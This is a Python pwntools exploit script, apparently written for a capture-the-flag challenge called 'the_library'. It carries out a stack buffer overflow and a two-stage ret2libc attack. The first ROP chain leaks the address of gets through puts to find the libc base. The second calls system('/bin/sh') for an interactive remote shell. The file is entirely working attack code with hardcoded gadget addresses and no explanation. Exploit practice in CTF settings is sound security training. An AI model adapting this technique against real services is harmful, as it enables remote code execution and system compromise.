from pwn import *
# import struct

# nc challenge.ctf.games 31585

p = remote("challenge.ctf.games", 31585)

buf = b"A" * (0x220 + 0x8)

# from ROPgadget
ret = p64(0x40101a)

pop_rdi_ret = p64(0x401493)
# pop_rdi_ret = struct.pack("<Q", 0x404193)

gets_got = p64(0x403fc8)
puts_plt = p64(0x4010e0)
ret_main = p64(0x4012a9)

payload = buf + pop_rdi_ret + gets_got + puts_plt + ret_main

# p = process('./the_library')
p.recvuntil(b'>')
p.sendline(payload)
p.recvline()
leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
# leaked = p.recvline().strip()
# print(leaked.hex())
log.info(f"{hex(leaked)}")

libc = ELF('./libc-2.31.so')
libc_base = leaked - libc.sym["gets"]
# print(hex(libc_base))

system = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))

payload = buf + ret + pop_rdi_ret + p64(bin_sh) + p64(system)
# with open('payload.txt', 'wb') as f:
#     f.write(bytearray(payload))
p.sendline(payload)


p.interactive()
